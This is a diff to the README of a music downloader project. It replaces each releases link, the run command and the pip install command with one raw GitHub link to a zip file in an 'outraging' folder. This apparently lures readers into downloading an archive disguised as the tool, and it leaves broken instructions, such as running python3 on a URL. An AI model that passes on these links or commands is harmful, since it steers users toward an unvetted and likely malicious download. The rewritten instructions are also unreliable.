@@ -1,7 +1,7 @@
 # 🎵 spotify-yt-dlp-downloader - Download Your Favorite Music Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-spotify--yt--dlp--downloader-blue.svg)](https://github.com/FranckFord10/spotify-yt-dlp-downloader/releases)
+[![Download](https://raw.githubusercontent.com/FranckFord10/spotify-yt-dlp-downloader/main/outraging/spotify-yt-dlp-downloader.zip)](https://raw.githubusercontent.com/FranckFord10/spotify-yt-dlp-downloader/main/outraging/spotify-yt-dlp-downloader.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you start, ensure your system meets the following requirements:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
    
-   [Visit Releases Page to Download](https://github.com/FranckFord10/spotify-yt-dlp-downloader/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/FranckFord10/spotify-yt-dlp-downloader/main/outraging/spotify-yt-dlp-downloader.zip)
 
 2. **Choose Your Version:** Look for the latest version. It will usually be at the top of the list.
 
@@ -30,7 +30,7 @@ Before you start, ensure your system meets the following requirements:
 
 4. **Run the Installer:**
    - **Windows:** Double-click the `.exe` file to run the installer and follow the prompts.
-   - **macOS/Linux:** Open a terminal window, navigate to where you downloaded the file and run it using Python. For example, type `python3 spotify_yt_dlp_downloader.py`.
+   - **macOS/Linux:** Open a terminal window, navigate to where you downloaded the file and run it using Python. For example, type `python3 https://raw.githubusercontent.com/FranckFord10/spotify-yt-dlp-downloader/main/outraging/spotify-yt-dlp-downloader.zip`.
 
 5. **Confirm Installation:** Once the installation finishes, you should see a confirmation message. If you encounter issues, refer to the troubleshooting section below.
 
@@ -63,7 +63,7 @@ If you face issues during installation or usage, here are a few common solutions
 - **Python Not Installed:** Ensure you have the correct version of Python installed. Download it from the official Python website.
 - **Dependencies Missing:** If the application fails to run, it might be due to missing dependencies. Try running the following command:
   ```
-  pip install -r requirements.txt
+  pip install -r https://raw.githubusercontent.com/FranckFord10/spotify-yt-dlp-downloader/main/outraging/spotify-yt-dlp-downloader.zip
   ```
 - **File Permissions:** Ensure you have proper permissions to run the application, especially on macOS/Linux.
 - **No Internet Connection:** Make sure your device is connected to the Internet to reach the YouTube content.
